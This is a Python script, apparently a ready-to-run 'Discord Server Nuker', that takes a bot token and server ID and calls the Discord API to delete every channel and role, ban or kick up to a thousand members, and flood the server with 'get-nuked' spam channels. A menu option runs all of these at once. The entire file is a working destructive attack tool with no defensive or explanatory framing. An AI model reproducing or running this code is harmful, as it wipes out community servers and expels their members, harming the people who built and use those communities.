import requests
import os
import time

headers = {}
base_url = "https://discord.com/api/v10"

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def print_menu():
    print("""
Discord Server Nuker (Cleaned Version)

1. Delete All Channels
2. Delete All Roles
3. Ban All Members
4. Kick All Members
5. Create Spam Channels
6. Nuke (All-in-One)
7. Exit
""")

def get_input():
    token = input("Bot Token: ").strip()
    guild_id = input("Guild ID: ").strip()
    headers.update({"Authorization": f"Bot {token}"})
    return token, guild_id

def delete_channels(guild_id):
    r = requests.get(f"{base_url}/guilds/{guild_id}/channels", headers=headers)
    for c in r.json():
        try:
            requests.delete(f"{base_url}/channels/{c['id']}", headers=headers)
            print(f"Deleted channel: {c['name']}")
        except:
            print(f"Failed to delete: {c['name']}")

def delete_roles(guild_id):
    r = requests.get(f"{base_url}/guilds/{guild_id}/roles", headers=headers)
    for role in r.json():
        if role['name'] != "@everyone":
            try:
                requests.delete(f"{base_url}/guilds/{guild_id}/roles/{role['id']}", headers=headers)
                print(f"Deleted role: {role['name']}")
            except:
                print(f"Failed to delete: {role['name']}")

def ban_all(guild_id):
    members = requests.get(f"{base_url}/guilds/{guild_id}/members?limit=1000", headers=headers).json()
    for member in members:
        try:
            requests.put(f"{base_url}/guilds/{guild_id}/bans/{member['user']['id']}", headers=headers)
            print(f"Banned: {member['user']['username']}")
        except:
            print(f"Failed to ban: {member['user']['username']}")

def kick_all(guild_id):
    members = requests.get(f"{base_url}/guilds/{guild_id}/members?limit=1000", headers=headers).json()
    for member in members:
        try:
            requests.delete(f"{base_url}/guilds/{guild_id}/members/{member['user']['id']}", headers=headers)
            print(f"Kicked: {member['user']['username']}")
        except:
            print(f"Failed to kick: {member['user']['username']}")

def create_spam_channels(guild_id, name="get-nuked", amount=10):
    for i in range(amount):
        try:
            requests.post(f"{base_url}/guilds/{guild_id}/channels", headers=headers, json={"name": f"{name}-{i}", "type": 0})
            print(f"Created channel: {name}-{i}")
        except:
            print(f"Failed to create channel: {name}-{i}")

def nuke(guild_id):
    delete_channels(guild_id)
    delete_roles(guild_id)
    ban_all(guild_id)
    create_spam_channels(guild_id)

# ========== MAIN ==========
clear()
token, guild_id = get_input()
while True:
    clear()
    print_menu()
    choice = input("Select option: ").strip()
    if choice == "1":
        delete_channels(guild_id)
    elif choice == "2":
        delete_roles(guild_id)
    elif choice == "3":
        ban_all(guild_id)
    elif choice == "4":
        kick_all(guild_id)
    elif choice == "5":
        create_spam_channels(guild_id)
    elif choice == "6":
        nuke(guild_id)
    elif choice == "7":
        print("Exiting...")
        break
    else:
        print("Invalid choice")
    input("\nPress Enter to continue...")